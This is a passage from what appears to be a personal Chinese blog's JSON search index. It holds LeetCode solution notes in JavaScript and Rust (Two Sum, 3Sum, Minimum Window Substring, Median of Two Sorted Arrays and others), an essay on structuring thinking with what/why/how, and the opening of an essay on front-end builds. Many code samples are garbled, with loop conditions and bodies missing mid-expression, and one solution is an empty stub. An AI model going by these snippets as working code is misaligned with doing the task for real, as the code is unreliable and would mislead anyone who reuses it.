(!buckets[i]?.length) continue;\n    for (let j = 0; j < buckets[i].length; j++) {\n      const num = bucketsi;\n      res.push(num);\n      k--;\n    }\n  }\n  return res;\n};\n\nEnd\n\n桶排序的处理对于分治是一种很好的理解手段。\n","title":"347. Top K Frequent Elements"},"3.longest-substring-without-repeating-characters.html":{"content":"3. Longest Substring Without Repeating Characters\n\nsource:\n\nQuestion\n\nGiven a string s, find the length of the longest substring without repeating characters.\n\n思路\n\n相当经典的一道滑动窗口的题目。在使用滑动窗口的模版的基础上，有一个非常重要的一个判断：window[rightC] > 1。进入循环的初始状态下，肯定是无重复子串的。所以只要当第一个字符串重复，左滑部分肯定对应的也是window[rightC]。\n\nvar lengthOfLongestSubstring = function (s) {\n\tconst window = {};\n\tlet ret = 0;\n\tlet left = 0;\n\tlet right = 0;\n\twhile (right  1) {\n\t\t\tconst leftC = s[left];\n\t\t\twindow[leftC]--;\n\t\t\tleft++;\n\t\t}\n\t\tright++;\n\t\tret = Math.max(ret, right - left);\n\t}\n\treturn ret;\n};\n\nEnd\n\n在使用模版的基础，得有一些小技巧，才可以快速的做出这题。\n","title":"3. Longest Substring Without Repeating Characters"},"11.container-with-most-water.html":{"content":"11. Container With Most Water\n\nsource:\n\nQuestion\n\nYou are given an integer array height of length n. There are n vertical lines drawn such that the two endpoints of the ith line are (i, 0) and (i, height[i]).\n\nFind two lines that together with the x-axis form a container, such that the container contains the most water.\n\nReturn the maximum amount of water a container can store.\n\nNotice that you may not slant the container.\n\n思路\n\n这题和42题看起来有点像，都是去接水，但是两者其实差别很大，一题是去算总共能接的水，一题是去算最优情况。但类似的是，他们都可以用双指针去做。\n\n从初始情况开始，宽度是最大的，之后无论怎么动，宽度都是在减小。除非两者高度的较小值变大。\n\n所以优先去移动高度较小的一边。\n\n/**\n @param {number[]} height\n @return {number}\n */\nvar maxArea = function(height) {\n\tlet p1 = 0;\n\tlet p2 = height.length - 1;\n\tlet ret = 0;\n\twhile (p1 < p2) {\n\t\tif (height[p1] <= height[p2]) {\n\t\t\tret = Math.max(ret, (p2 - p1) * height[p1]);\n\t\t\tp1++;\n\t\t} else {\n\t\t\tret = Math.max(ret, (p2 - p1) * height[p2]);\n\t\t\tp2--;\n\t\t}\n\t}\n\treturn ret;\n};\n\n总结\n\n链表的while遍历方式应用很普遍。","title":"11. Container With Most Water"},"15.3sum.html":{"content":"15. 3Sum\n\nsource:\n\nQuestion\n\nGiven an integer array nums, return all the triplets [nums[i], nums[j], nums[k]] such that i != j, i != k, and j != k, and nums[i] + nums[j] + nums[k] == 0.\n\nNotice that the solution set must not contain duplicate triplets.\n\n暴力法\n\n这道题可以粗暴的用三个loop去比较，然后筛选distinct的tuple. 很明显，时间复杂度是O(n3), 在leetcode上是会超标的。\n\nvar threeSum = function (nums) {\n  const ret = [];\n  for (let i1 = 0; i1  a - b).join(\",\");\n          if (!ret.includes(v)) ret.push(v);\n        }\n      }\n    }\n  }\n  return ret.map((v) => v.split(\",\"));\n};\n\n优化思路\n\n由于三个元素是不重复的，可以得到一个不等式：\n\na  a - b);\n  for (let i = 0; i  0) {\n        p2--;\n      } else if (v  v.split(\",\"));\n};\n\n优化不判断重复值：\n\nvar threeSum = function (nums) {\n  const ret = [];\n  nums.sort((a, b) => a - b);\n  for (let i1 = 0; i1  0) return ret;\n    if (i1 > 0 && a === nums[i1 - 1]) continue;\n    let p1 = i1 + 1;\n    let p2 = nums.length - 1;\n    while (p1  0) {\n        p2 -= 1;\n      } else if (v < 0) {\n        p1 += 1;\n      } else {\n        ret.push([a, nums[p1], nums[p2]]);\n        while (p1 < p2 && nums[p1] === nums[p1 + 1]) p1 += 1;\n        while (p1 < p2 && nums[p2] === nums[p2 - 1]) p2 -= 1;\n        p1 += 1;\n        p2 -= 1;\n      }\n    }\n  }\n  return ret;\n};\n\n总结\n\n对于排序数组，多个loop，可以忘双指针这个思路去优化。\n","title":"15. 3Sum"},"76.minimum-window-substring.html":{"content":"76. Minimum Window Substring\n\nsource:\n\nQuestion\n\nGiven two strings s and t of lengths m and n respectively, return the minimum window substring of s such that every character in t (including duplicates) is included in the window. If there is no such substring, return the empty string \"\".\n\nThe testcases will be generated such that the answer is unique.\n\nA substring is a contiguous sequence of characters within the string.\n\n暴力法\n\n用两个loop，一个是起始位置，一个是在剩余数组中去查询何时包含所有子字符串。\n\nvar minWindow = function (s, t) {\n  let ret = \"\";\n  for (let i1 = 0; i1  v === s[i2]);\n      if (index > -1) {\n        arr.splice(index, 1);\n        if (arr.length === 0) {\n          const v = s.slice(i1, i2 + 1);\n          if (v.length < ret.length || !ret) ret = v;\n          break;\n        }\n      }\n    }\n  }\n  return ret;\n};\n\n时间复杂度是O(n2)。\n\n滑动窗口\n\n因为有两个loop，且是在数组中进行操作，很容易想到滑动窗口。\n\nvar minWindow = function (s, t) {\n  const window = {};\n  const need = {};\n  for (let c of t) need[c] = (need[c] || 0) + 1;\n  let left = 0;\n  let right = 0;\n  let valid = 0;\n  let start = 0;\n  let len = Number.MAXSAFEINTEGER;\n  while (right < s.length) {\n    const c = s[right];\n    right++;\n    if (need[c]) {\n      window[c] = (window[c] || 0) + 1;\n      if (window[c] === need[c]) valid++;\n    }\n    while (valid === Object.keys(need).length) {\n      if (right - left < len) {\n          start = left;\n          len = right - left;\n      }\n      const d = s[left];\n      left++;\n      if (need[d]) {\n        if (window[d] === need[d]) valid--;\n        window[d]--;\n      }\n    }\n  }\n  return len === Number.MAXSAFEINTEGER ? '' : s.slice(start, start + len);\n};\n\nEnd\n\n对于滑动窗口的模版要极为熟悉。\n","title":"76. Minimum Window Substring"},"22.generate-parentheses.html":{"content":"22. Generate Parentheses\n\nsource:\n\nQuestion\n\nGiven n pairs of parentheses, write a function to generate all combinations of well-formed parentheses.\n\n思路\n\n这题可以用回溯法去做。但是要筛选掉以)结尾，但是)数量大于(.\n\nvar generateParenthesis = function (n) {\n  const ret = [];\n  const nums = [...Array(n).fill(\"(\"), ...Array(n).fill(\")\")];\n  const backtrack = (track, is) => {\n    if (track.length === nums.length) {\n      const v = track.join(\"\");\n      if (!ret.includes(v)) ret.push(v);\n      return;\n    }\n    for (let i = 0; i  v === \")\").length + 1 >\n          track.filter((v) => v === \"(\").length\n      )\n        break;\n      track.push(nums[i]);\n      backtrack(track, [...is, i]);\n      track.pop();\n    }\n  };\n  backtrack([], []);\n  return ret;\n};\n\nEnd\n\n对于回溯法的模版要熟练。\n","title":"22. Generate Parentheses"},"46.permutations.html":{"content":"46. Permutations\n\nsource:\n\nQuestion\n\nGiven an array nums of distinct integers, return all the possible permutations. You can return the answer in any order.\n\n思路\n\n对于这种找出所有可能性的问题，应该第一时间想到回溯法。\n\nvar permute = function (nums) {\n  const ret = [];\n  const backtrack = (track) => {\n    if (track.length === nums.length) return ret.push([...track]);\n    for (let i = 0; i < nums.length; i++) {\n      if (track.includes(nums[i])) continue;\n      track.push(nums[i]);\n      backtrack(track);\n      track.pop();\n    }\n  };\n  backtrack([]);\n  return ret;\n};\n\n总结\n\n这题可以作为回溯法的模版，比较典型。","title":"46. Permutations"},"4.median-of-two-sorted-arrays.html":{"content":"4. Median of Two Sorted Arrays\n\nsource:\n\nQuestion\n\nGiven two sorted arrays nums1 and nums2 of size m and n respectively, return the median of the two sorted arrays.\n\nThe overall run time complexity should be O(log (m+n)).\n\n初想法\n\n如果使用已有的sort函数，看v8的代码：\n\n在数组长度小于等于10时是用插入排序，大于10是用快速排序。\n\n这里我们先只考虑快速排序，那么平均状况下时间复杂度是O(nlogn)，和题目要求的O(logn)相比还是有差距的。\n\nvar findMedianSortedArrays = function (nums1, nums2) {\n  const arr = [...nums1, ...nums2].sort((a, b) => a - b);\n  return arr.length % 2 === 1\n    ? arr[(arr.length - 1) / 2]\n    : (arr[Math.floor((arr.length - 1) / 2)] +\n        arr[Math.ceil((arr.length - 1) / 2)]) /\n        2;\n};\n\n二分查找\n\n这里有一个很重要的前提条件，这两个数组是sorted的。\n\n在此前提下，每次找k/2个元素，根据两个数组k/2位置元素的大小，就可以排除k/2个元素，然后一步步找到第k个元素。\n\n时间复杂度是O(log(m+n)).\n\n/**\n @param {number[]} nums1\n @param {number[]} nums2\n @return {number}\n */\nvar findMedianSortedArrays = function (nums1, nums2) {\n  /**\n   找到两个sorted arrays的排序为k的元素\n   */\n  const getKthElement = (k) => {\n    const len1 = nums1.length;\n    const len2 = nums2.length;\n    let index1 = 0;\n    let index2 = 0;\n    while (true) {\n      if (index1 === len1) {\n        // * nums1 到头了\n        return nums2[index2 + k - 1];\n      } else if (index2 === len2) {\n        // * nums2 到头了\n        return nums1[index1 + k - 1];\n      } else if (k === 1) {\n        // * 最后一次比较\n        return Math.min(nums1[index1], nums2[index2]);\n      }\n\n      const half = k >> 1; // JS 中 k/2 不是整除，可以用parseInt(k/2)代替\n      let newIndex1 = Math.min(index1 + half - 1, len1 - 1); // * 要注意index1+half-1可能会越界溢出, 所以下标最大为len1-1\n      let newIndex2 = Math.min(index2 + half - 1, len2 - 1); // 同上\n\n      if (nums1[newIndex1] > 1;\n  // * 核心思路为, 用二分找到从小到大第K个数\n  if (totalLength % 2 === 1) {\n    return getKthElement(median + 1);\n  } else {\n    return (getKthElement(median) + getKthElement(median + 1)) / 2;\n  }\n};\n\nEnd\n\nO(logn)的复杂度可以优先想到分支法。\n","title":"4. Median of Two Sorted Arrays"},"33.search-in-rotated-sorted-array.html":{"content":"33. Search in Rotated Sorted Array\n\nsource:\n\nQuestion\n\nThere is an integer array nums sorted in ascending order (with distinct values).\n\nPrior to being passed to your function, nums is possibly rotated at an unknown pivot index k (1  num === target);\n};\n\n二分查找\n\n这题的一个关键是要找到一个前提：\n\n数组旋转后，必然有一半是升序的\n\n基于这一半的有序数组，去做二分查找：\n\n/**\n @param {number[]} nums\n @param {number} target\n @return {number}\n */\nvar search = function (nums, target) {\n  if (!nums.length) return -1;\n  let left = 0, right = nums.length - 1, mid = -1;\n  while (left > 1);\n    // 找到目标\n    if (nums[mid] === target) return mid;\n    // 数组左侧是升序\n    if (nums[mid] >= nums[left]) {\n      // 目标在数组左侧, 缩小右边界\n      if (target >= nums[left] && target = nums[mid]) {\n        left = mid + 1;\n      }\n      // 目标在数组左侧，缩小右边界\n      else {\n        right = mid - 1;\n      }\n    }\n  }\n  // 未找到\n  return -1;\n};\n\nEnd\n\n对于查找有序数组中某个元素的问题，可以优先考虑二分查找。\n","title":"33. Search in Rotated Sorted Array"},"1.two-sum.html":{"content":"1. Two Sum\n\nsource:\n\nQuestion\n\nGiven an array of integers nums and an integer target, return indices of the two numbers such that they add up to target.\n\nYou may assume that each input would have exactly one solution, and you may not use the same element twice.\n\nYou can return the answer in any order.\n\n暴力法\n\n遍历两个数组，在index不一致的情况下找出合为target的组合。\n\n很明显，时间复杂度是O(n2)，空间复杂度是O(1).\n\n在时间复杂度上来说是非常昂贵的。\n\npub fn two_sum(nums: Vec, target: i32) -> Vec {\n    let mut ret = [].to_vec();\n    for (index1, v1) in nums.iter().enumerate() {\n        for (index2, v2) in nums.iter().enumerate() {\n            if (v1 + v2) == target && index1 != index2 {\n                ret.push(index1 as i32);\n                ret.push(index2 as i32);\n                return ret;\n            }\n        }\n    }\n    ret\n}\n\n暴力法的优化\n\n在上述的暴力法中，有很多重复的计算。\n\n对于数组中的某个元素，他和数组中的其他元素的match如下：\n\n不用每次从头比对，从本次比对元素的那个位置开始就可以：\n\nfn two_sum(nums: Vec, target: i32) -> Vec {\n    let mut ret = [].to_vec();\n    for (index1, v1) in nums.iter().enumerate() {\n        for (index2, v2) in nums.iter().enumerate().filter(|&(i, _)| i > index1) {\n            if (v1 + v2) == target {\n                ret.push(index1 as i32);\n                ret.push(index2 as i32);\n                return ret;\n            }\n        }\n    }\n    ret\n}\n\n当然，时间复杂度仍然是O(n2)，并没有本质上的改变。\n\n哈希表\n\n因为有两个nested for loop，所以时间复杂度才会这么高。\n\n那么要降低时间复杂度，最直接的思路就是 loop => hash，理想状态下的hashmap的时间复杂度是O(1)。\n\nkey: 值\nvalue: 值对应的数组下标\n\nfn two_sum(nums: Vec, target: i32) -> Vec {\n    use std::collections::HashMap;\n    let mut kv = HashMap::::new();\n    for (index1, value) in nums.iter().enumerate() {\n        let index2 = kv.get(&(target - value));\n        match index2 {\n            Some(i) => return [(*i) as i32, index1 as i32].to_vec(),\n            None => {\n                kv.insert(*value, index1);\n            },\n        }\n    }\n    [].to_vec()\n}\n\n/**\n @param {number[]} nums\n @param {number} target\n @return {number[]}\n */\nvar twoSum = function(nums, target) {\n    const map = {};\n    for (let i = 0; i  a - b);\n  let p1 = 0;\n  let p2 = arr.length - 1;\n  while (p1  target) {\n      p2--;\n    } else if (v  v === arr[p1]);\n      const i2 = nums.findIndex((v, i) => i !== i1 && v === arr[p2]);\n      return [i1, i2];\n    }\n  }\n};\n\n时间复杂度是O(nlogn), 空间复杂度也是O(n).\n\n总结\n\n在优化时间复杂度的时候，针对数组，可以优先考虑利用hashmap去提升便利效率，利用空间换时间。\n","title":"1. Two Sum"},"7.reverse-integer.html":{"content":"7. Reverse Integer\n\nsource:\n\nQuestion\n\nGiven a signed 32-bit integer x, return x with its digits reversed. If reversing x causes the value to go outside the signed 32-bit integer range [-231, 231 - 1], then return 0.\n\nAssume the environment does not allow you to store 64-bit integers (signed or unsigned).\n\n思路\n\n比较常规的一题。\n\n/**\n @param {number} x\n @return {number}\n */\nvar reverse = function(x) {\n    const s = Array.from(${x});\n    let minus = false;\n    if (s[0] === '-') {\n        s.shift();\n        minus = true;\n    }\n    s.reverse();\n    const v = Number(s.join(''));\n    if (v > 2 ** 31 - 1) return 0;\n    return minus ? -v : v;\n};\n","title":"7. Reverse Integer"},"20.valid-parentheses.html":{"content":"20. Valid Parentheses\n\nsource:\n\nQuestion\n\nGiven a string s containing just the characters '(', ')', '{', '}', '[' and ']', determine if the input string is valid.\n\nAn input string is valid if:\n\nOpen brackets must be closed by the same type of brackets.\nOpen brackets must be closed in the correct order.\n\n思路\n\n看到括号，一开始联想到了22题，其实22题中也要判断()的有效性，但这题的判断明显要复杂很多，因为有多种括号类型。\n\n一开始用排除法的方式，写出所有无效的情况，很难写对。\n\n用栈的方式就清晰明了很多:\n\n对于闭口，上一个必然是自己的合口（因为其他括号对都被pop了）\n\n/**\n @param {string} s\n @return {boolean}\n */\nvar isValid = function (s) {\n\tif (s.length % 2 === 1) return false;\n\tconst stack = [];\n\tconst map = {\n\t\t')': '(',\n\t\t']': '[',\n\t\t'}': '{'\n\t};\n\tfor (let char of s) {\n\t\tif (map[char]) {\n\t\t\tconst last = stack.pop();\n\t\t\tif (last !== map[char]) return false;\n\t\t} else {\n\t\t\tstack.push(char);\n\t\t}\n\t}\n\treturn !stack.length;\n};\n\n总结\n\n对于括号有效性问题，要优先想到用栈的数据结构。\n","title":"20. Valid Parentheses"},"31.next-permutation.html":{"content":"31. Next Permutation\n\nsource:\n\nQuestion\n\nA permutation of an array of integers is an arrangement of its members into a sequence or linear order.\n\nFor example, for arr = [1,2,3], the following are considered permutations of arr: [1,2,3], [1,3,2], [3,1,2], [2,3,1].\nThe next permutation of an array of integers is the next lexicographically greater permutation of its integer. More formally, if all the permutations of the array are sorted in one container according to their lexicographical order, then the next permutation of that array is the permutation that follows it in the sorted container. If such arrangement is not possible, the array must be rearranged as the lowest possible order (i.e., sorted in ascending order).\n\nFor example, the next permutation of arr = [1,2,3] is [1,3,2].\nSimilarly, the next permutation of arr = [2,3,1] is [3,1,2].\nWhile the next permutation of arr = [3,2,1] is [1,2,3] because [3,2,1] does not have a lexicographical larger rearrangement.\nGiven an array of integers nums, find the next permutation of nums.\n\nThe replacement must be in place and use only constant extra memory.\n\n思路\n\n/**\n @param {number[]} nums\n @return {void} Do not return anything, modify nums in-place instead.\n */\nvar nextPermutation = function (nums) {\n  let i = nums.length - 2;\n  // 寻找第一个比右侧元素小的元素的index\n  while (i >= 0 && nums[i] >= nums[i + 1]) i--;\n  // 这个元素存在\n  if (i >= 0) {\n    let j = nums.length - 1;\n    while (j >= 0 && nums[j] <= nums[i]) j--;\n    [nums[i], nums[j]] = [nums[j], nums[i]];\n  }\n  let l = i + 1;\n  let r = nums.length - 1;\n  while (l < r) {\n    [nums[l], nums[r]] = [nums[r], nums[l]];\n    l++;\n    r--;\n  }\n};\n\nEnd\n","title":"31. Next Permutation"},"54.spiral-matrix.html":{"content":"54. Spiral Matrix\n\nsource:\n\nQuestion\n\nGiven an m x n matrix, return all elements of the matrix in spiral order.\n\n思路\n\n这题的思路其实很直接，就是改变方向：\n\n方向顺序是：right => down => left => up\n排除已经遍历过的行列\n\n稍微注意的是，matrix的取数据是matrixy.\n\n/**\n @param {number} matrix\n @return {number[]}\n */\nvar spiralOrder = function (matrix) {\n  const m = matrix.length,\n    n = matrix[0].length,\n    ret = [],\n    // 已遍历的x轴\n    passX = [],\n    // 已遍历的y轴\n    passY = [];\n  let order = 0,\n    x = 0,\n    y = 0;\n  while (ret.length !== m * n) {\n    if (matrixy]?.[x] !== undefined) ret.push(matrix[y);\n    // 下一个点\n    switch (order) {\n      // right\n      case 0:\n        if (x === n - 1 || passX.includes(x + 1)) {\n          passY.push(y);\n          order = (order + 1) % 4;\n          y += 1;\n        } else {\n          x += 1;\n        }\n        break;\n      // down\n      case 1:\n        if (y === m - 1 || passY.includes(y + 1)) {\n          passX.push(x);\n          order = (order + 1) % 4;\n          x -= 1;\n        } else {\n          y += 1;\n        }\n        break;\n      // left\n      case 2:\n        if (x === 0 || passX.includes(x - 1)) {\n          passY.push(y);\n          order = (order + 1) % 4;\n          y -= 1;\n        } else {\n          x -= 1;\n        }\n        break;\n      // up\n      case 3:\n        if (y === 0 || passY.includes(y - 1)) {\n          passX.push(x);\n          order = (order + 1) % 4;\n          x += 1;\n        } else {\n          y -= 1;\n        }\n        break;\n      default:\n        break;\n    }\n  }\n  return ret;\n};\n\nEnd\n\n做题目要有耐心，做复杂的题目要注意细节。\n","title":"54. Spiral Matrix"},"56.merge-intervals.html":{"content":"56. Merge Intervals\n\nsource:\n\nQuestion\n\nGiven an array of intervals where intervals[i] = [starti, endi], merge all overlapping intervals, and return an array of the non-overlapping intervals that cover all the intervals in the input.\n\n思路\n\n这题看到的第一反应是去把数组中的元素补齐，去重后然后合并区间，但是对于1,4和1,5这种case没有太好的区分方法，只好作罢。\n\n后续的思路是排序后根据重合区间来做，如图：\n\n/**\n @param {number} intervals\n @return {number}\n */\nvar merge = function (intervals) {\n  const ret = [];\n  // 根据起始位置排序\n  intervals.sort((a, b) => a[0] - b[0]);\n  let prev = intervals[0];\n  for (let i = 0; i = intervalsi) {\n      prev1] = Math.max(intervals[i, prev[1]);\n      // 区间不重合\n    } else {\n      ret.push(prev);\n      prev = intervals[i];\n    }\n  }\n  // 最后一个区间遇不到和他不重合的区间，手动push\n  ret.push(prev);\n  return ret;\n};\n\nEnd\n\n遇到重合区间的问题，可以想一下如果巧妙的使用排序，同时注意细节。\n","title":"56. Merge Intervals"},"200.number-of-islands.html":{"content":"200. Number of Islands\n\nsource:\n\nQuestion\n\nGiven an m x n 2D binary grid grid which represents a map of '1's (land) and '0's (water), return the number of islands.\n\nAn island is surrounded by water and is formed by connecting adjacent lands horizontally or vertically. You may assume all four edges of the grid are all surrounded by water.\n\n初想法\n\npub fn num_islands(grid: Vec>) -> i32 {\n\n}\n\n总结\n","title":"200. Number of Islands"},"415.add-strings.html":{"content":"415. Add Strings & 43. Multiply Strings\n\nsource:\n\nQuestion\n\nGiven two non-negative integers num1 and num2 represented as string, return the sum of num1 and num2.\n\nNote:\n\nThe length of both num1 and num2 is  arr2.length ? arr1.length : arr2.length); i++) {\n        const v = ${arr1[i] + arr2[i] + (borrow ? 1 : 0)};\n        if (v.length > 1) {\n            borrow = true;\n            ret.push(v[1]);\n        } else {\n            borrow = false;\n            ret.push(v[0]);\n        }\n    }\n    return [...ret, borrow ? '1' : ''].reverse().join('') || '0';\n};\n\n时间复杂度和空间复杂度都是O(n).\n\n如果考虑小数，就是按.分开，各自相加，小数部分在整部部分有可能借位1.\n\nPlus: 相乘\n\nsource:\n\n大致的思路是：\n\n每一位的数字做乘法\n每位要多加一个0\n然后用相加的方式相加\n\nfunction multiply(num1: string, num2: string): string {\n    const arr1 = Array.from(num1).reverse();\n    const arr2 = Array.from(num2).reverse();\n\n    let value = '0';\n    for (let i = 0; i  1) {\n                borrow = v[0];\n                ret.push(v[1]);\n            } else {\n                borrow = 0;\n                ret.push(v[0]);\n            }\n        }\n        if (borrow) {\n            ret.push(${borrow});\n        }\n        let v = ret.reverse().join('') || '0';\n        for (let j = 0; j  415\n        value = addStrings(value, v);\n    }\n    return value.replace(/^0+/g, '') || '0';\n};\n\nPlusPlus： 相减\n\n这里还可以有一个进阶版，两个数相减。\n\n相比两数相加，相减的难度在于要多判断一个负数的情况。\n\n思路如下：\n\n用0补位\n和加法一样要考虑借位，只不过是减一\n要考虑负数的情况，我的想法是先比较大小，确定符号再大数减小数\n去掉多余的补位0\n\nfunction subtractStrings(num1, num2) {\n    // 补位0\n    while (num1.length = num2;\n    // 确定大数，小数和符号\n    const [larger, less, symbol] = [...(isLarger ? [num1, num2] : [num2, num1]), isLarger ? '' : '-'];\n\n    const arr1 = Array.from(larger).reverse();\n    const arr2 = Array.from(less).reverse();\n\n    let borrow = false;\n    const ret = [];\n\n    for (let i = 0; i  arr2.length ? arr1.length : arr2.length); i++) {\n\n        const isZero = arr1[i] === '0';\n\n        // 0的话借位成10\n        if (isZero) {\n            arr1[i] = 10 - (borrow ? 1 : 0);\n            borrow = true;\n        } else {\n            arr1[i] = arr1[i] - (borrow ? 1 : 0);\n            borrow = false;\n        }\n\n        // 借位的情况1x\n        if (arr1[i] < arr2[i]) {\n            borrow = true;\n            arr1[i] = 1${arr1[i]};\n        } else if (!isZero) {\n            borrow = false;\n        }\n\n        const v = arr1[i] - arr2[i];\n        ret.push(v);\n    }\n    if (borrow) ret[ret.length - 1] -= 1;\n    return ${symbol}${ret.reverse().join('').replace(/^0+/g, '') || '0'};\n};\n","title":"415. Add Strings & 43. Multiply Strings"},"organize_idea.html":{"content":"组织思路的一些方法论\n\n当我在和他人交流的过程，经常发现自己会陷入一种状态：\n\n没有重点\n讲到哪算哪，没有清晰的思路\n缺乏全盘考虑\n\n明明我有一些想法，为什么却张不了口；为什么我对这东西应该很熟悉，但是思路却很模糊。\n\n首先，我在认识的过程中，就没有组织好自己的思路，也就是说，没有刻意的去组织和理解事物的结构。其次，在输出观点的过程中，不能层次分明，突出重点，导致自己都理解不了自己说了些啥，更不要说倾听者了。\n\n如果把事物的信息比作data，那么我在理解的过程中，或者说存的过程中，没做任何处理，只是简单的写入进了我的大脑。然后在取的时候查找困难，而且取出的数据七零八落，甚至不能保证数据的完整性和顺序。\n\n那么通过组织思路，在存的时候，先结构化数据，并且做好分类和索引。再根据数据结构，制作自己的sql parser，这样取数据的性能和有效性就都得到了提升。\n\n虽然这样会增大存的代价，也就是学习的代价，但是从目标上，即运用自己的认知这个目的，来说是值得的，在表达自己的观点上，可以做到层次分明，突出重点。\n\n从收益的角度讲，一次研发，终身受益，每个人都可以是自己的技术产品经理。\n\nWhat：是什么\n\nWhat可以是一个虚拟的概念，也可以是真实的存在。在认知的过程中，比如第一次看到一只猫，第一个浮现在脑海中的想法可能是一个啥？\n\n用结构化的方式去理解的话，我觉得核心的重点是给出一个明确的定义，最好一句话就可以说清楚。\n\n就像数学上的公式，确切的反映了事物内部和外部的关系，是我们从一种事物到达另一种事物的依据，使我们更好的理解事物的本质和内涵。\n\n说起来简单，但是要给出一个明确定义，可能要综合考量why和how，甚至去compare。在理解的过程，可以采用progressive方式，先给出一个初步的，模糊的定义，然后再去一遍遍的去更新。\n\n从这一个核心触发，可以做一些延展：\n\n会用到这个概念的一些场景\n一些实际的例子\n这个理解可能的一些用途\n\nWhy: 为什么\n\n在很多情况下，其实why是比what更先出现的。比如在研究的过程中，先有了一个问题，然后才会有解决方案，有了解决方案才有各种概念，来归纳思路。\n\n但是，在学习的过程中，尽管从why讲到what也是一种方式，而且是可以领悟的更透彻的一种方式，但是对作为凡夫俗子的我来说，更常见的情况仍然是先知晓了初步的概念，甚至是使用了一段时间，才会回过头来思考，why，这猫为什么出现在这？\n\n从这一步开始，思考会更加的深入，甚至可能推翻我们已经有的what的定义。当然，这里的why，范围要缩小到我们正在思考学习的一些应用概念上，对于为什么会有宇宙，为什么有人类这种why，是没办法去思考的。\n\n我觉得理解why的一个很好的方式就是比对，为什么是不是其他，而是这个？ 为什么是猫出现在这，而不是狗出现在这？这样可以让思路更加具体，更快的进入思考的状态。\n\n因为当我们问自己why，或者别人问我们why的时候，往往是因为还有些选择。比如，人们就不会问为什么你要当你父母的孩子这种蠢问题，因为答案显而易见，大家都没得选。\n\n既然如此，在思考这类问题的时候，我们就可以列举一下其他的一些选择，比如A, B, C，为什么A， 而不是B和C，想想他们之间的区别，也许答案就会更明了一些。\n\nHow：怎么做\n\n虽然把how放在了最后说，但是在很多实际的情况中，顺序往往都是反的。\n\n人们都是先去做了，然后才会一脸懵逼的想why，然后才反应过来这是个what，甚至有些人对某些事物，一直会停留在某个阶段。\n\n从主动学习的角度上，how应该是要求最高的，因为他的确要基于what和why。\n\n在思考how的问题时候，我觉得可以转换一下，把how，先转换成what和why。比如，猫是怎么抓老鼠的，就可以转变成，什么是猫捉老鼠，为什么猫可以捉到老鼠。\n\n在这个基础上，我们必须要先理解了什么是猫和什么是老鼠，为什么狗就抓不到呢，才可以做进一步的有价值的思考。\n\n所以说，在我理解中，how的难度应该是最大的，因为他其实隐式的包括了what和why的思考。\n\n组合优于继承\n\n通过wwh的组织方式，其实可以已经在atomic的层面上组织好思路了。\n\n但是就像我们已经用各种算法和数据结构实现了数据库，实际的场景其实不会那么简单，我们要去建表，关联，添加索引，然后才能写出sql。\n\n现实中的交流是复杂和千变万化的，比如，为什么人们要用猫来捉老鼠？\n\n用先前的思路，这个问题可能是一个why的问题，但是要更深的去理解的话，这其中其实包括了2个what，1个how和1和why：\n\nwhat is 猫\nwhat is 老鼠\nhow 猫捉老鼠\nwhy 选择猫\n\n用像推积木一样组合的方式，一步步的搭建出思路，对于我这种单线程的大脑来说应该是更友好的。\n\nEnd\n\n单单只是开发完成的话，肯定是还远远达不到可以应用在生产环境的水平的，那么就必须在测试环境一遍遍的跑用例，测试出bug和各种问题，完善自己的思维，才可以达到可以上线的水平。\n\n实际来说的话，还是要不断的应用，去结构化自己的思路。\n\n当然，如果我有一个有64g内存，1PB的ssd，双3080ti的大脑，那么用啥数据库就没那么所谓啦哈哈哈哈。\n","title":"组织思路的一些方法论"},"web_building.html":{"content":"对于前端构建的一点思考\n\n对于构建，相信对于每个前端都不是一件陌生的事情。\n\n2021典型的web前端场景：前端在根据ts/jsx/esm这些规范写完代码之后，然后开始构建产生bundle，这些bundle里ts/jsx/esm都被转换成了兼容低版本浏览器的代码(表现和规范一样，但是实现完全不同), 然后把这份bundle上传到cdn。之后，用户根据对外域名，通过nginx转发访问到这些静态资源。\n\n无论是开发时webpack让人感觉浪费生命的hmr，还是构建过程完全可以去喝一杯咖啡/上个厕所滑个水的时长，都让人不由产生一点疑惑：前端构建真的是必须的吗？我们的三剑客完全可以直接跑在浏览器上呀？\n\n少年太久不思考人生就会变成油腻的中年人，程序员太久不思考现状就会变成用手指写代码的真.码农，所以对构建这件事，做一点思考，让自己少点油腻，远离机械劳动。\n\n历史演进\n\n历史从不重复，但他押韵。\n\n由史可以知兴亡，要知道为什么前端构建为什么会是现在的样子，就不得不去探究更久远的年代发生了什么。\n\n创世纪\n\n1993年，NCSA Mosaic的问世开启了浏览器的时代。\n\n那时候的页面非常简单，仅仅使用html/css/js去完成，没有任何构建的步骤，就像现在lua之于游戏引擎，在主要是展示的页面上，操作有限的浏览器对象去完成页面的有限交互。\n\n对于很多前端原教旨主义者 (https://12ft.io/api/proxy?q=https://unixsheikh.com/articles/so-called-modern-web-developers-are-the-culprits.html)而言，这是最完美的形态：\n\n无构建步骤，没有任何开发等待时间\n所写即所运行，没有任何中间步骤，方便调试\n基于静态文件，上手开发极快\n\n我在写自己的博客网站(https://bert0324.github.io/)的过程中，一开始就是这么做的，非常的舒服，轻/简单/部署方便(配合github).\n\n但是，随着文章数的变多，对博客功能的要求变多，我遇到了一些困扰：\n\n难以复用代码。基于dom去制作组件，代码复用非常麻烦\n新语法支持。比如optional chaining/decorator之类仍在proposal/stage的语法，难以马上使用\n代码组织问题。基于html/js去组织代码，很容易让代码变得非常难维护\n\n出埃及记\n\n之后随着IE, Firefox， 